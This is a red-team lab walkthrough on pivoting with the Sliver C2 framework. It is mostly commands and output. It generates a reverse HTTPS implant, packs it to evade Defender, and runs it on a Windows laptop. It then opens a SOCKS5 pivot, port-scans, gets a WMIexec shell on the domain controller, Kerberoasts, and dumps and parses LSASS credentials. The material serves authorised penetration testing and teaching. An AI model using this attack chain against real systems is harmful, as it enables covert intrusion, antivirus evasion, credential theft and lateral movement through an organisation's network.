=======================================================================================================================================
Pivoting with the SLIVER Adversary emulation / Red Team Framework
=======================================================================================================================================

SLIVER is an open source cross-platform adversary emulation/red team framework, it can be used by organizations of all sizes to perform security testing.

=> https://github.com/BishopFox/sliver
=> https://redsiege.com/blog/2022/11/introduction-to-sliver/
=> https://dominicbreuker.com/post/learning_sliver_c2_01_installation/
=> https://redheadsec.tech/sliver-c2-all-hackers-gain-deathtouch-in-2021/

Context
========
During during penetration tests, Command and Control solutions (C2) like the SLIVER framework can be used to create a reverse tunnel between a target Windows/Linux server or a Windows laptop located inside a company internal network and an Internet-facing remote server belonging to the pentesters (e.g. a Kali VM running in AWS or Azure).
Creating a reverse tunnel is usefull to pass trhough firewalls and to pivot inside a company's internal network after having compromise for example a vulnerable internet-facing website (e.g. unpatched RCE flaws) or a laptop via a phishing attack.

Basic test lab
===============
> Kali Linux (192.168.56.104)
> Windows 10 Laptop with Defender AV enabled and up-to-date (192.168.1.113)
> Windows 2016 server with Defender AV enabled and up-to-date (192.168.1.51)
> Windows DC 2016 with Defender AV enabled and up-to-date (192.168.1.167)

The Kali Linux box can't reach the network 192.168.1.0/24. 
To be able to reach the machines located in the network 192.168.1.0/24 we will start a SLIVER implant (reverse HTTPS shell with a proxy socks) on the Windows 10 laptop to pivot and then attack the machines located in the network 192.168.1.0/24.


Miscellaneous notes
====================

1. Pivoting with SLIVER C2
---------------------------
> SLIVER session (implant) + command "socks5 start" + Proxychains / Post-exploitaion modules & armory extensions

> By default, the SLIVER implant attempts to auto-detect proxy settings using a modified version of the go-get-proxied library. 
  It supports detection of system proxy settings on Windows, MacOS, and Linux. In the event the implant cannot make a successful HTTP/HTTPS connection
  for a given domain using the system proxy settings, it will also attempt to make a connection to the same domain ignoring the proxy settings. 
  The order of connection attempts is as follows:
  --> 1st = HTTPS over system proxy  --> 2nd = HTTP over system proxy --> 3rd HTTPS direct connect --> 4th = HTTP direct connect

> Order of priority to retrieve the Windows proxy configuration:
  + Windows Environment Variable: HTTPS_PROXY, HTTP_PROXY, FTP_PROXY, or ALL_PROXY. NO_PROXY is respected.
  + Internet Options: Automatically detect settings (WPAD)
  + Internet Options: Use automatic configuration script (PAC)
  + Internet Options: Manual proxy server
  + WINHTTP: (netsh winhttp)
  
> NTLM/Kerberos Proxy Authentication: SLIVER implant (advanced options) can use the wininet HTTP library, which supports NTLM/Kerberos authentication (Windows only).  

2. AV detection of SLIVER implants (C2 agents)
----------------------------------------------
To avoid AV detection it is recommended to use:
> obfuscation, encryption and compression methods with a packer or a shellcode loader
> AMSI and ETW bypass techniques
> Fileless techniques
> etc...

3. Difference between a "Session" implant and a "Beacon" implant 
-----------------------------------------------------------------
> The session mode makes the SLIVER implant establishes an interactive session with immediate command execution and feedback. 
> The beacon mode makes the SLIVER implant connect back and fetch jobs in regular intervals. 

4. Difference between "Staged" and "Stageless" payloads
-------------------------------------------------------
> A staged payload is as compact as possible and performs the single task of providing the means for an attacker to upload something bigger.
  It uses a (small) stager that connects to the SLIVER handler to download and execute the stage (the final payload).
> A stageless payload is self-contained and completely standalone.


=====================================================================================================================
PoC - Step 1 - Install the SLIVER C2 framework on the Kali Linux box
=====================================================================================================================

jeff@kali:~/Documents/Tools$ sudo apt-get install sliver
[sudo] password for jeff: 
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following packages were automatically installed and are no longer required:
  cpp-9 dh-elpa-helper dkms hashcat-data libasan5 libavresample4 libc-devtools libc6-dev:i386 libclang1-8 libcroco3 libcrypt-dev:i386 libdav1d5
  libfaudio0 libgcc-8-dev libigdgmm11 libindicator3-7 libjsoncpp24 libllvm8 libmpx2 libnsl-dev:i386 libnsl2:i386 libobjc-8-dev libodbc1 libodbccr2
  libomp-8-dev libomp5-8 libpocl2-common libstb0 libstdc++-8-dev libsvtav1enc0 libtirpc-dev:i386 libtirpc3:i386 linux-compiler-gcc-10-x86
  linux-headers-5.14.0-kali4-amd64 linux-headers-5.14.0-kali4-common linux-headers-5.4.0-kali3-common linux-headers-amd64 linux-kbuild-5.14
  linux-kbuild-5.4 linux-libc-dev:i386 llvm-8 llvm-8-dev llvm-8-runtime openjdk-11-jre openjdk-8-jre python-babel-localedata python3-babel
  python3-chameleon python3-flask-babelex python3-repoze.lru python3-waitress python3-webtest python3-zope.component python3-zope.event
  python3-zope.hookable python3.7 python3.7-minimal virtualbox-guest-dkms virtualbox-guest-utils x11-session-utils xinit xorg-docs-core
Use 'sudo apt autoremove' to remove them.
The following additional packages will be installed:
  binutils-mingw-w64 build-essential
The following NEW packages will be installed:
  binutils-mingw-w64 build-essential sliver
0 upgraded, 3 newly installed, 0 to remove and 1464 not upgraded.
Need to get 170 MB of archives.
After this operation, 250 MB of additional disk space will be used.
Do you want to continue? [Y/n] Y
Get:1 http://ftp.free.fr/pub/kali kali-rolling/main amd64 binutils-mingw-w64 all 2.37-7+9 [144 kB]
Get:2 http://ftp.free.fr/pub/kali kali-rolling/main amd64 build-essential amd64 12.9 [7,704 B]
Get:3 http://ftp.free.fr/pub/kali kali-rolling/main amd64 sliver amd64 1.5.31-0kali1 [170 MB]
Fetched 170 MB in 6s (28.1 MB/s)                                                                                                                          
Selecting previously unselected package binutils-mingw-w64.
(Reading database ... 371370 files and directories currently installed.)
Preparing to unpack .../binutils-mingw-w64_2.37-7+9_all.deb ...
Unpacking binutils-mingw-w64 (2.37-7+9) ...
Selecting previously unselected package build-essential.
Preparing to unpack .../build-essential_12.9_amd64.deb ...
Unpacking build-essential (12.9) ...
Selecting previously unselected package sliver.
Preparing to unpack .../sliver_1.5.31-0kali1_amd64.deb ...                                                                                                 
Unpacking sliver (1.5.31-0kali1) ...                                                                                                                       
Setting up binutils-mingw-w64 (2.37-7+9) ...                                                                                                               
Setting up build-essential (12.9) ...                                                                                                                      
Setting up sliver (1.5.31-0kali1) ...                                                                                                                      
Processing triggers for kali-menu (2021.2.1) ...  


=====================================================================================================================
PoC - Step 2 - Start the SLIVER server and create an operator on the Kali Linux box
=====================================================================================================================

jeff@kali:~/Documents/Tools/SLiver-C2$ sudo sliver-server

Sliver  Copyright (C) 2022  Bishop Fox
This program comes with ABSOLUTELY NO WARRANTY; for details type 'licenses'.
This is free software, and you are welcome to redistribute it
under certain conditions; type 'licenses' for details.

Unpacking assets ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝                                                                                                  
                                                                                                                                                           
All hackers gain conspire
[*] Server v1.5.31 - kali
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

[server] sliver > help

<SNIP>

Multiplayer:
============
  kick-operator  Kick an operator from the server
  multiplayer    Enable multiplayer mode
  new-operator   Create a new operator config file
  operators      Manage operators

For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki


Creation of the new-operator 'jeff' and activation of the "multiplayer" mode
-----------------------------------------------------------------------------

[server] sliver > new-operator --name jeff --lhost localhost --save /home/jeff/.sliver-client

[*] Generating new client certificate, please wait ... 
[*] Saved new client config to: /home/jeff/.sliver-client/jeff_localhost.cfg 

[server] sliver >  
[server] sliver > multiplayer

[*] Multiplayer mode enabled!

[*] jeff has joined the game


Commands to join the SLIVER C2 server as 'jeff' with the SLIVER client
-----------------------------------------------------------------------
jeff@kali:~/.sliver-client/configs$ sudo chown -R jeff:jeff /home/jeff/.sliver-client/configs && chmod 764 /home/jeff/.sliver-client

jeff@kali:~/.sliver-client/configs$ sliver-client
Connecting to localhost:31337 ...

.------..------..------..------..------..------.                                                                                                           
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |                                                                                                           
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |                                                                                                           
| :\/: || (__) || :\/: || ()() || :\/: || ()() |                                                                                                           
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|                                                                                                           
`------'`------'`------'`------'`------'`------'                                                                                                           
                                                                                                                                                           
All hackers gain prowess
[*] Server v1.5.31 - kali
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >  


=====================================================================================================================
PoC - Step 3 - Set up a SLIVER HTTPS handler
=====================================================================================================================

[server] sliver > help https

Start an HTTPS listener

Usage:
======
  https [flags]

Flags:
======
  -c, --cert                    string    PEM encoded certificate file
  -D, --disable-otp                       disable otp authentication
  -E, --disable-randomized-jarm           disable randomized jarm fingerprints
  -d, --domain                  string    limit responses to specific domain
  -h, --help                              display help
  -k, --key                     string    PEM encoded private key file
  -e, --lets-encrypt                      attempt to provision a let's encrypt certificate
  -L, --lhost                   string    interface to bind server to
  -J, --long-poll-jitter        string    server-side long poll jitter (default: 2s)
  -T, --long-poll-timeout       string    server-side long poll timeout (default: 1s)
  -l, --lport                   int       tcp listen port (default: 443)
  -p, --persistent                        make persistent across restarts
  -t, --timeout                 int       command timeout in seconds (default: 60)
  -w, --website                 string    website name (see websites cmd)


[server] sliver > https --lhost 192.168.56.104 --lport 443

[*] Starting HTTPS :443 listener ...

[*] Successfully started job #1

[server] sliver >  


=====================================================================================================================
PoC - Step 4 - Generate a SLIVER implant (reverse HTTPS payload)
=====================================================================================================================

[server] sliver > help generate

Command: generate <options>
About: Generate a new sliver binary and saves the output to the cwd or a path specified with --save.

<SNIP>

Usage:
======
  generate [flags]

Flags:
======
  -a, --arch               string    cpu architecture (default: amd64)
  -c, --canary             string    canary domain(s)
  -d, --debug                        enable debug features
  -n, --dns                string    dns connection strings
  -e, --evasion                      enable evasion features (e.g. overwrite user space hooks)
  -E, --external-builder             use an external builder
  -f, --format             string    Specifies the output formats, valid values are: 'exe', 'shared' (for dynamic libraries), 'service' (see `psexec` for more info) and 'shellcode' (windows only) (default: exe)
  -h, --help                         display help
  -b, --http               string    http(s) connection strings
  -X, --key-exchange       int       wg key-exchange port (default: 1337)
  -w, --limit-datetime     string    limit execution to before datetime
  -x, --limit-domainjoined           limit execution to domain joined machines
  -F, --limit-fileexists   string    limit execution to hosts with this file in the filesystem
  -z, --limit-hostname     string    limit execution to specified hostname
  -L, --limit-locale       string    limit execution to hosts that match this locale
  -y, --limit-username     string    limit execution to specified username
  -k, --max-errors         int       max number of connection errors (default: 1000)
  -m, --mtls               string    mtls connection strings
  -N, --name               string    agent name
  -p, --named-pipe         string    named-pipe connection strings
  -o, --os                 string    operating system (default: windows)
  -P, --poll-timeout       int       long poll request timeout (default: 360)
  -j, --reconnect          int       attempt to reconnect every n second(s) (default: 60)
  -R, --run-at-load                  run the implant entrypoint from DllMain/Constructor (shared library only)
  -s, --save               string    directory/file to the binary to
  -l, --skip-symbols                 skip symbol obfuscation
  -Z, --strategy           string    specify a connection strategy (r = random, rd = random domain, s = sequential)
  -T, --tcp-comms          int       wg c2 comms port (default: 8888)
  -i, --tcp-pivot          string    tcp-pivot connection strings
  -I, --template           string    implant code template (default: sliver)
  -t, --timeout            int       command timeout in seconds (default: 60)
  -g, --wg                 string    wg connection strings

Sub Commands:
=============
  beacon  Generate a beacon binary
  info    Get information about the server's compiler
  stager  Generate a stager using Metasploit (requires local Metasploit installation)


[server] sliver > generate --arch amd64 -f exe --http 192.168.56.104 --save /home/jeff/Documents/Tools/SLiver-C2/SliverRevShell.exe --os Windows

[*] Generating new windows/amd64 implant binary
[*] Symbol obfuscation is enabled
[*] Build completed in 2m6s
[*] Implant saved to /home/jeff/Documents/Tools/SLiver-C2/SliverRevShell.exe

jeff@kali:~/Documents/Tools/SLiver-C2$ sudo chmod 777 SliverRevShell1.exe 


Note - Command to generate an implant that goes through an NTLM/Kerberos proxy
-------------------------------------------------------------------------------
> generate --arch amd64 -f exe --http <IP or domain.com> --save /temp/SliverRevShell.exe --os Windows --driver wininet --proxy <IP> 
           --proxy-username <login> --proxy-password <password>

# driver - Manually specify the HTTP driver (string). On windows this value can be set to wininet to use the wininet HTTP library for C2 communication.
# proxy  - Manually specify HTTP proxy. The format should be one that is accepted by the Go HTTP library.
# proxy-username - Specify a proxy username. Only valid with the Go HTTP driver.
# proxy-password - Specify the proxy password. Only valid with the Go HTTP driver.


====================================================================================================================================================
PoC - Step 5 - Generate a packed version of the SLIVER implant and run it on the target Windows 10 laptop (with Defender AV enabled and up-to-date)
====================================================================================================================================================

jeff@kali:~/Documents/Tools/SLiver-C2$ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
192.168.56.1 - - [02/Jan/2023 06:35:49] "GET / HTTP/1.1" 200 -
192.168.56.1 - - [02/Jan/2023 06:35:50] "GET /Packed-SliverRevShell.exe HTTP/1.1" 200 -

Notes
-----
> Multiple tools can be used to "pack/obfuscate/encrypt" the SLIVER implants (e.g. https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)) 
> Our packed version of the SLIVER implant is using obfuscation, encryption and compression techniques as well as direct syscalls to avoid AV/EDR detection.
  Compression is very important because the original SLIVER implant that we generated was very big (i.e. around 18 MB) => our packed version is 'only' 5 MB.

C:\temp> dir 
 Volume in drive C is Windows
 Volume Serial Number is 9C9C-7212

 Directory of C:\temp

02/01/2023  04:00    <DIR>          .
02/01/2023  04:00    <DIR>          ..
23/12/2022  00:51         5,407,744 Packed-SliverRevShell.exe
<SNIP>


C:\temp> Packed-SliverRevShell.exe


========================================================================================================================================
PoC - Step 6 - Get the reverse shell and then configure a SOCKS proxy 5 within the SLIVER session (command 'socks5 start')
========================================================================================================================================

[server] sliver > jobs

 ID   Name    Protocol   Port 
==== ======= ========== ======
 1    https   tcp        443  


[*] Session 12d24a56 BOILING_LIVER - 192.168.1.113:14737 (Laptop1) - windows/amd64 - Sat, 31 Dec 2022 01:02:21 CET


[server] sliver > sessions

 ID         Transport   Remote Address        Hostname   Username        Operating System   Health  
========== =========== ===================== ========== =============== ================== =========
 12d24a56   http(s)     192.168.1.113:14737   Laptop1   Administrator   windows/amd64      [ALIVE] 


[server] sliver > sessions -i 12d24a56

[*] Active session BOILING_LIVER (12d24a56)


[server] sliver (BOILING_LIVER) > getuid

S-1-5-21-936125016-2310263949-2175806047-500


[server] sliver (BOILING_LIVER) > whoami

Logon ID: Laptop1\Administrator
[*] Current Token ID: Laptop1\Administrator


[server] sliver (BOILING_LIVER) > socks5 start

[*] Started SOCKS5 127.0.0.1 1081  
âš   In-band SOCKS proxies can be a little unstable depending on protocol

              
server] sliver (BOILING_LIVER) > background

[*] Background ...

[server] sliver > 

------------------------------------------------------------------
Notes
# apt-get install proxychains
# cp /etc/proxychains.conf /etc/proxychains.conf.backup
# echo "socks5 127.0.0.1 1081" >> /etc/proxychains.conf
------------------------------------------------------------------
Configuration of Proxychains
------------------------------------------------------------------

jeff@kali:~$ tail /etc/proxychains.conf 
#       proxy types: http, socks4, socks5
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
# socks4  127.0.0.1 9050
# socks5  127.0.0.1 1080
socks5  127.0.0.1 1081
               
               
=====================================================================================================================================================
PoC - Step 7 - Use Proxychains on the Kali Linux server (192.168.56.104) and the SLIVER session (socks5) to pivot into the network '192.168.1.0/24'
=====================================================================================================================================================

without using Proxychains and the SLIVER session, the network traffic is filtered towards the Windows machines '192.168.1.113' and '192.168.1.167' from the Kali VM 
---------------------------------------------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/SLiver-C2$ nmap -Pn -sT -p 3389 192.168.1.113,167
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-02 01:05 CET
Nmap scan report for 192.168.1.113
Host is up (0.0000060s latency).

PORT     STATE    SERVICE
3389/tcp filtered ms-wbt-server

Nmap scan report for 192.168.1.167
Host is up (0.000025s latency).

PORT     STATE    SERVICE
3389/tcp filtered ms-wbt-server

Nmap done: 2 IP addresses (2 hosts up) scanned in 13.09 seconds


Example 1 - Nmap port scan of the Windows machines '192.168.1.113' and '192.168.1.167' (from the KALI VM) over the SLIVER session
---------------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/SLiver-C2$ proxychains nmap -Pn -sT -p 3389 192.168.1.113,167
ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2023-01-02 01:07 CET
|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.167:3389-<><>-OK
|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.113:3389-<><>-OK
Nmap scan report for 192.168.1.113
Host is up (0.044s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap scan report for 192.168.1.167
Host is up (0.025s latency).

PORT     STATE SERVICE
3389/tcp open  ms-wbt-server

Nmap done: 2 IP addresses (2 hosts up) scanned in 13.14 seconds


Example 2 - WMIexec (impacket) connection to the Windows DC 2016 (192.168.13.167) from the Kali VM over the SLIVER session
---------------------------------------------------------------------------------------------------------------------------

jeff@kali:~/Documents/Tools/SLiver-C2$ proxychains impacket-wmiexec company.work/chuck.norris.adm@192.168.1.167
ProxyChains-3.1 (http://proxychains.sf.net)
Impacket v0.9.21.dev1 - Copyright 2020 SecureAuth Corporation

Password:
|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.167:445-<><>-OK
[*] SMBv3.0 dialect used
|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.167:135-<><>-OK
|S-chain|-<>-127.0.0.1:1081-<><>-192.168.1.167:49666-<><>-OK
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
DC1

C:\>whoami
company\chuck.norris.adm

C:\>exit


=======================================================================================================================================
PoC - Step 8 - Use the SLIVER post-exploitation modules and the 'ARMORY' extensions to pivot into the network '192.168.1.0/24' 
               and to attack the machines hosted inside this subnet
=======================================================================================================================================

There are many post-exploitation modules available with the SLIVER C2 framework.

Below are some examples of post-exploitation commands and modules:

[server] sliver (BOILING_LIVER) > help

Commands:
=========
  clear       clear the screen
  exit        exit the shell
  help        use 'help [command]' for command help
  monitor     Monitor threat intel platforms for Sliver implants
  wg-config   Generate a new WireGuard client config
  wg-portfwd  List ports forwarded by the WireGuard tun interface
  wg-socks    List socks servers listening on the WireGuard tun interface

Generic:
========
  aliases           List current aliases
  armory            Automatically download and install extensions/aliases
  background        Background an active session
  beacons           Manage beacons
  builders          List external builders
  canaries          List previously generated canaries
  cursed            Chrome/electron post-exploitation tool kit (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ
  dns               Start a DNS listener
  env               List environment variables
  generate          Generate an implant binary
  hosts             Manage the database of hosts
  http              Start an HTTP listener
  https             Start an HTTPS listener
  implants          List implant builds
  jobs              Job control
  licenses          Open source licenses
  loot              Manage the server's loot store
  mtls              Start an mTLS listener
  prelude-operator  Manage connection to Prelude's Operator
  profiles          List existing profiles
  reaction          Manage automatic reactions to events
  regenerate        Regenerate an implant
  sessions          Session management
  settings          Manage client settings
  stage-listener    Start a stager listener
  tasks             Beacon task management
  update            Check for updates
  use               Switch the active session or beacon
  version           Display version information
  websites          Host static content (used with HTTP C2)
  wg                Start a WireGuard listener

Multiplayer:
============
  kick-operator  Kick an operator from the server
  multiplayer    Enable multiplayer mode
  new-operator   Create a new operator config file
  operators      Manage operators

Sliver - Windows:
=================
  backdoor          Infect a remote file with a sliver shellcode
  dllhijack         Plant a DLL for a hijack scenario
  execute-assembly  Loads and executes a .NET assembly in a child process (Windows Only)
  getprivs          Get current privileges (Windows only)
  getsystem         Spawns a new sliver session as the NT AUTHORITY\SYSTEM user (Windows Only)
  impersonate       Impersonate a logged in user.
  make-token        Create a new Logon Session with the specified credentials
  migrate           Migrate into a remote process
  psexec            Start a sliver service on a remote target
  registry          Windows registry operations
  rev2self          Revert to self: lose stolen Windows token
  runas             Run a new process in the context of the designated user (Windows Only)
  spawndll          Load and execute a Reflective DLL in a remote process

Sliver:
=======
  cat                Dump file to stdout
  cd                 Change directory
  close              Close an interactive session without killing the remote process
  download           Download a file
  execute            Execute a program on the remote system
  execute-shellcode  Executes the given shellcode in the sliver process
  extensions         Manage extensions
  getgid             Get session process GID
  getpid             Get session pid
  getuid             Get session process UID
  ifconfig           View network interface configurations
  info               Get info about session
  interactive        Task a beacon to open an interactive session (Beacon only)
  kill               Kill a session
  ls                 List current directory
  mkdir              Make a directory
  msf                Execute an MSF payload in the current process
  msf-inject         Inject an MSF payload into a process
  mv                 Move or rename a file
  netstat            Print network connection information
  ping               Send round trip message to implant (does not use ICMP)
  pivots             List pivots for active session
  portfwd            In-band TCP port forwarding
  procdump           Dump process memory
  ps                 List remote processes
  pwd                Print working directory
  reconfig           Reconfigure the active beacon/session
  rename             Rename the active beacon/session
  rm                 Remove a file or directory
  rportfwd           reverse port forwardings
  screenshot         Take a screenshot
  shell              Start an interactive shell
  shikata-ga-nai     Polymorphic binary shellcode encoder (ãƒŽ ã‚œÐ”ã‚œ)ãƒŽ ï¸µ ä»•æ–¹ãŒãªã„
  sideload           Load and execute a shared object (shared library/DLL) in a remote process
  socks5             In-band SOCKS5 Proxy
  ssh                Run a SSH command on a remote host
  terminate          Terminate a process on the remote system
  upload             Upload a file
  whoami             Get session user execution context


For even more information, please see our wiki: https://github.com/BishopFox/sliver/wiki


[server] sliver (BOILING_LIVER) > background

[*] Background ...


[server] sliver > help armory

Automatically download and install extensions/aliases

Usage:
======
  armory [flags]

Flags:
======
  -h, --help                   display help
  -c, --ignore-cache           ignore metadata cache, force refresh
  -I, --insecure               skip tls certificate validation
  -p, --proxy        string    specify a proxy url (e.g. http://localhost:8080)
  -t, --timeout      string    download timeout (default: 15m)

Sub Commands:
=============
  install  Install an alias or extension
  search   Search for aliases and extensions by name (regex)
  update   Update installed an aliases and extensions

[server] sliver > armory install all

? Install 18 aliases and 83 extensions? No

[server] sliver > 

[server] sliver > armory install windows-credentials

[*] Installing extension 'nanodump' (v0.0.5) ... done!
[*] Installing extension 'credman' (v1.0.7) ... done!
[*] Installing extension 'chromiumkeydump' (v0.0.2) ... done!
[*] Installing extension 'handlekatz' (v0.0.1) ... done!

[server] sliver > armory install windows-bypass

[*] Installing extension 'inject-etw-bypass' (v0.0.3) ... done!
[*] Installing extension 'inject-amsi-bypass' (v0.0.2) ... done!
[*] Installing extension 'unhook-bof' (v0.0.2) ... done!

[server] sliver > armory install c2-tool-collection

[*] Installing extension 'c2tc-addmachineaccount' (v0.0.4) ... done!
[*] Installing extension 'c2tc-askcreds' (v0.0.4) ... done!
[*] Installing extension 'c2tc-kerberoast' (v0.0.4) ... done!
[*] Installing extension 'c2tc-lapsdump' (v0.0.4) ... done!
[*] Installing extension 'c2tc-petitpotam' (v0.0.4) ... done!
[*] Installing extension 'c2tc-psw' (v0.0.4) ... done!
[*] Installing extension 'c2tc-smbinfo' (v0.0.4) ... done!
[*] Installing extension 'c2tc-winver' (v0.0.4) ... done!

[server] sliver > armory install .net-pivot

[*] Installing alias 'KrbRelayUp' (v0.0.1) ... done!
[*] Installing alias 'Rubeus' (v0.0.21) ... done!
[*] Installing alias 'Certify' (v0.0.2) ... done!
[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
[*] Installing alias 'SharpChrome' (v0.0.1) ... done!
[*] Installing alias 'SharpDPAPI' (v0.0.1) ... done!
[*] Installing alias 'sqlrecon' (v0.0.1) ... done!
[*] Installing alias 'SharpLAPS' (v0.0.1) ... done!

[server] sliver > armory install .net-execute

[*] Installing alias 'Sharp SMBExec' (v0.0.3) ... done!
[*] Installing alias 'Sharp WMI' (v0.0.2) ... done!
[*] Installing alias 'SharpMapExec' (v0.0.1) ... done!
[*] Installing alias 'SharPersist' (v0.0.1) ... done!
[*] Installing alias 'SharpRDP' (v0.0.1) ... done!

[server] sliver > armory install .net-recon

[*] Installing alias 'Seatbelt' (v0.0.3) ... done!
[*] Installing alias 'Sharp Hound 3' (v0.0.2) ... done!
[*] Installing alias 'SharpUp' (v0.0.1) ... done!
[*] Installing alias 'SharpView' (v0.0.1) ... done!
[!] Failed to install alias 'sharpview': 'sharpview' command already exists
[server] sliver >  


[server] sliver > sessions

 ID         Transport   Remote Address        Hostname   Username        Operating System   Health  
========== =========== ===================== ========== =============== ================== =========
 12d24a56   http(s)     192.168.1.113:14737   Laptop1   Administrator   windows/amd64      [ALIVE] 


[server] sliver >  sessions -i  12d24a56

[*] Active session BOILING_LIVER (12d24a56)


[server] sliver (BOILING_LIVER) > 
[server] sliver (BOILING_LIVER) > sharpmapexec ntlm smb /user:chuck.norris.adm /password:<SNIP> /domain:company /computername:192.168.1.167 /m:shares

[*] sharpmapexec output:
ntlmsmb
------------------
[*] User:   chuck.norris.adm
[*] domain: company
[*] secret: <SNIP>

[*] Checking 192.168.13.125
[*] SMB Versions:   [+]SMBv1 [+]SMBv2(0x0202) [+]SMBv2(0x0210) [+]SMBv3(0x0300) [+]SMBv3(0x0302) [-]SMBv3(0x0311)
[*] SMBv1  Signing: [-]Signing Not Required
[*] SMBv2+ Signing: [+]Signing Required
[*] OS Version:     COMPANY - 10.0.14393
  [+] Local Admin on 192.168.1.167
    [*] Listing shares on 192.168.1.167
--- Accessible Shares ---
    [+]ADMIN$
    [+]C$
--- No Access ---
    [-]IPC$
    [-]NETLOGON
    [-]SYSVOL


[server] sliver (BOILING_LIVER) > 
[server] sliver (BOILING_LIVER) > rubeus kerberoast /creduser:"company.work\chuck.norris.adm" /credpassword:<SNIP> /domain:company.work /dc:192.168.1.167 /nowrap

[*] rubeus output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.1 


[*] Action: Kerberoasting

[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.

[*] Target Domain          : company.work
[*] Searching path 'LDAP://192.168.1.167/DC=company,DC=work' for '(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

[*] Total kerberoastable users : 5


[*] SamAccountName         : svc_vulscanner
[*] DistinguishedName      : CN=svc vulnscanner,CN=Users,DC=company,DC=work
[*] ServicePrincipalName   : DC1/svc_vulnscanner.company.work:8080
[*] PwdLastSet             : 24/08/2022 21:21:41
[*] Supported ETypes       : RC4_HMAC_DEFAULT

 [X] Error during request for SPN DC1/svc_vulnscanner.company.work:8080@company.work :
<SNIP>


[server] sliver (BOILING_LIVER) > ps

 Pid     Ppid    Owner                          Arch     Executable                                     Session 
======= ======= ============================== ======== ============================================== =========
 0       0                                               [System Process]                               -1      
 4       0                                      x86_64   System                                         0       
 72      4                                      x86_64   Secure System                                  0       
 132     4                                      x86_64   Registry                                       0       
 532     4                                      x86_64   smss.exe                                       0       
 700     624                                    x86_64   csrss.exe                                      0       
 788     624                                    x86_64   wininit.exe                                    0       
 928     788                                    x86_64   services.exe                                   0       
 948     788     NT AUTHORITY\SYSTEM            x86_64   LsaIso.exe                                     0       
 956     788     NT AUTHORITY\SYSTEM            x86_64   lsass.exe                                      0
 <SNIP>       
? [1/6] Continue? No


[server] sliver (BOILING_LIVER) > help nanodump

A Beacon Object File that creates a minidump of the LSASS process.

Usage:
======
  nanodump [flags] pid dump-name write-file signature

Args:
=====
  pid         int       The PID of the process you want to dump.
  dump-name   string    The name of the dump file.
  write-file  int       1 = write file, 0 = fileless
  signature   string    Signature used for evasion, PMDM = default

Flags:
======
  -h, --help           display help
  -t, --timeout int    command timeout in seconds (default: 60)


[server] sliver (BOILING_LIVER) > nanodump 956 memorydump 1 PMDM

[*] Successfully executed nanodump (coff-loader)
[*] Got output:
Done, to download the dump run:
download memorydump
to get the secretz run:
python3 -m pypykatz lsa minidump memorydump


[server] sliver (BOILING_LIVER) > ls

C:\Users\Administrator\Downloads (7 items, 445.7 MiB)
==============================================================
-rw-rw-rw-  desktop.ini                      282 B      Tue Apr 20 19:02:20 +0100 2021
-rw-rw-rw-  memorydump                       14.4 MiB   Wed Jan 04 18:11:06 +0100 2023
-rw-rw-rw-  Packed-SliverRevShell.exe         5.4 MiB   Wed Jan 04 14:35:35 +0100 2023


[server] sliver (BOILING_LIVER) > download memorydump

[*] Wrote 15090602 bytes (1 file successfully, 0 files unsuccessfully) to /home/jeff/memorydump

[server] sliver (BOILING_LIVER) >  


------------------

jeff@kali:~$ python3 -m pypykatz lsa minidump /home/jeff/memorydump
INFO:pypykatz:Parsing file memorydump
FILE: ======== memorydump =======
== LogonSession ==
authentication_id 678126503 (286b63a7)
session_id 10
username Administrator
domainname Laptop1
logon_server Laptop1
logon_time 2023-01-04T10:06:39.133286+00:00
sid S-1-5-21-936125016-2310263949-2175806047-500
luid 678126503
        == MSV ==
                Username: Administrator
                Domain: Laptop1
                LM: NA
                NT: 36f7a3ebaa54935ecf0367<SNIP>
                SHA1: d5feabcececab0e16c2c<SNIP>
                DPAPI: NA
        == WDIGEST [286b63a7]==
                username Administrator
                domainname Laptop1
                password None
                password (hex)
        == Kerberos ==
                Username: Administrator
                Domain: Laptop1
        == WDIGEST [286b63a7]==
                username Administrator
                domainname Laptop1
                password None
                password (hex)
        == TSPKG [286b63a7]==
                username Administrator
                domainname Laptop1
